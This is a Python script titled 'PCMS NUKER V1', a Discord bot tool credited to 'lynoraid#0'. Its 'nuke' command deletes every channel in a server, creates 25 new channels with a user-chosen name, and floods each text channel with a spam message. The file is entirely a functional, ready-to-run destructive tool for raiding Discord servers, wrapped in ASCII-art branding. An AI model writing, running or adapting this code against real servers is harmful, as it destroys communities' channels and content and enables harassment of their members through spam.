"""
 _______   ______  __       __  ______  
|       \ /      \|  \     /  \/      \ 
| ▓▓▓▓▓▓▓\  ▓▓▓▓▓▓\ ▓▓\   /  ▓▓  ▓▓▓▓▓▓\
| ▓▓__/ ▓▓ ▓▓   \▓▓ ▓▓▓\ /  ▓▓▓ ▓▓___\▓▓
| ▓▓    ▓▓ ▓▓     | ▓▓▓▓\  ▓▓▓▓\▓▓    \ 
| ▓▓▓▓▓▓▓| ▓▓   __| ▓▓\▓▓ ▓▓ ▓▓_\▓▓▓▓▓▓\
| ▓▓     | ▓▓__/  \ ▓▓ \▓▓▓| ▓▓  \__| ▓▓
| ▓▓      \▓▓    ▓▓ ▓▓  \▓ | ▓▓\▓▓    ▓▓
 \▓▓       \▓▓▓▓▓▓ \▓▓      \▓▓ \▓▓▓▓▓▓ 
                                        
                                        
PCMS NUKER V1
"""


import os
# define packages , if nor either install or run normally
try:
    import asyncio
    import colorama
    import discord
# if module isn't exist on pc then install.
except ModuleNotFoundError:
    print("Installing Packages...")
    # os method
    os.system("pip install asyncio")
    os.system("pip install colorama")
    os.system("pip install discord")
    print("Reopen This File if it dosen't loaded now.")

from discord.ext import commands
from pystyle import *
from colorama import Fore,Style


intents = discord.Intents.all()


#pcms logo
os.system('cls')

#on icon define.
def icon():
    Write.Print("""
    
        ██████╗  ██████╗███╗   ███╗███████╗
        ██╔══██╗██╔════╝████╗ ████║██╔════╝
        ██████╔╝██║     ██╔████╔██║███████╗
        ██╔═══╝ ██║     ██║╚██╔╝██║╚════██║
        ██║     ╚██████╗██║ ╚═╝ ██║███████║
        ╚═╝      ╚═════╝╚═╝     ╚═╝╚══════╝
                     
                     MADE BY lynoraid#0                   
                PCMS NUKER V1
    
    """,Colors.red_to_blue,interval=0.0000)

#on start
icon()
token = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Token:")
prefix = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Prefix:")
channelname = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Channel name:")
spammsg = input(Fore.LIGHTGREEN_EX+"\n > Enter Your Bot Spamming Message:")
bot = commands.Bot(command_prefix=prefix, intents=intents)

# Event that runs when the bot is ready
@bot.event
async def on_ready():
    os.system('cls')
    icon()
    await bot.change_presence(status=discord.Status.dnd)
    Write.Print(f'\nLogged in as {bot.user.name} ({bot.user.id})',Colors.red_to_blue,interval=0.0000)
    Write.Print(f"\n Commands : \n {prefix}nuke",Colors.red_to_blue,interval=0.0000)


# NUKE COMMAND BY LYNO ( trash)
@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    channels = guild.channels
    for channel in channels:
        await channel.delete()

    for _ in range(25):
        await guild.create_text_channel(name=channelname)

    for channel in guild.text_channels:
        for _ in range(5):
            await channel.send(spammsg)

try:
    bot.run(token)
except discord.errors.LoginFailure:
    print(Fore.RED+"\n > Bot Token Isn't Found !")